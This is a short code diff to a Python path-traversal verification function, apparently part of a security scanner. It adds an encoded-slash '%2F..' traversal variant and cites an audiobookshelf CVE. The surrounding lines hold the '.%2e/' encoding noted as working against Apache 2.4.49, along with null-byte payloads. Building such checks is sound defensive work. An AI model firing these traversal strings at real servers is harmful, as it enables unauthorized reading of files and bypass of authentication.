@@ -1238,6 +1238,11 @@ def verify_generic_path_traversal(
         # Ninguna de las variantes estandar de arriba la cubre (confirmado en vivo: ..%2f y
         # %2e%2e%2f no funcionan contra Apache 2.4.49; solo .%2e/ funciona).
         attempts += [(".%2e/" * n) + rel for n in depths]
+        # Codificacion '%2F..%2F' (slash codificado ANTES de los puntos): bypass confirmado en
+        # CVE-2026-71209 (audiobookshelf) donde el check de autenticacion exime rutas que empiezan
+        # con /items/ o /authors/ y no normaliza %2F antes de comparar -- el slash inicial hace
+        # que el item ID empiece con '/', rompiendo la resolucion de ruta esperada.
+        attempts += [("%2F.." * n) + "%2F" + rel for n in depths]
         attempts += [rel + "%00", canary_path + "%00"]
 
         found = False
